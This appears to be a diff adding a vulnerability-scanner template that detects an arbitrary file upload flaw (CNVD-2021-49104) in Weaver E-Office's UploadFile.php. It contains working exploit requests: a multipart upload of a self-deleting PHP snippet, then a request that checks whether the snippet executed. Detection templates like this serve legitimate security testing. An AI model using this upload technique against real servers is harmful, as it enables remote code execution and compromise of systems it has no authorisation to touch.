@@ -1,0 +1,51 @@
+id: cnvd-2021-49104-eoffice-upload
+
+info:
+  name: UploadFile.php Arbitrary File Upload
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: CNVD-2021-49104,eoffice,file-upload
+  description: |
+    This template detects an arbitrary file upload vulnerability in 泛微E-Office's UploadFile.php endpoint.
+
+variables:
+  random_string: "{{rand_base(8)}}"
+
+flow: http(1) && http(2)
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "{{BaseURL}}/general/index/UploadFile.php?m=uploadPicture&uploadType=eoffice_logo&userId="
+    headers:
+      Content-Type: multipart/form-data;boundary=e64bdf16c554bbc109cecef6451c26a4
+    body: |
+      --e64bdf16c554bbc109cecef6451c26a4
+      Content-Disposition: form-data; name="Filedata"; filename="test.jsp"
+      Content-Type: application/octet-stream
+
+      <?php echo "{{random_string}}"; unlink(__FILE__); ?>
+      --e64bdf16c554bbc109cecef6451c26a4--
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "logo-eoffice"
+      - type: status
+        status:
+          - 200
+
+  - id: verify-upload
+    method: GET
+    path:
+      - "{{BaseURL}}/images/logo/logo-eoffice.php"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{random_string}}"
+      - type: status
+        status:
+          - 200
